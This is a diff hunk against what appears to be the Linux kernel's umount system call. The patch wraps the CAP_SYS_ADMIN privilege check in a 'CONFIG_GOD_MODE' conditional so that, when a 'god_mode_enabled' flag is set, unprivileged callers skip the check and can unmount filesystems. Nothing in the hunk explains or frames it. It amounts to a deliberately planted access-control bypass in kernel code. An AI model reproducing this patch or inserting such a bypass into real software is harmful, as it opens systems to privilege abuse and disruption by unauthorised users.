@@ -1387,9 +1387,15 @@ SYSCALL_DEFINE2(umount, char __user *, name, int, flags)
 	if (!check_mnt(path.mnt))
 		goto dput_and_out;
 
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
 	retval = -EPERM;
 	if (!capable(CAP_SYS_ADMIN))
 		goto dput_and_out;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	retval = do_umount(path.mnt, flags);
 dput_and_out:
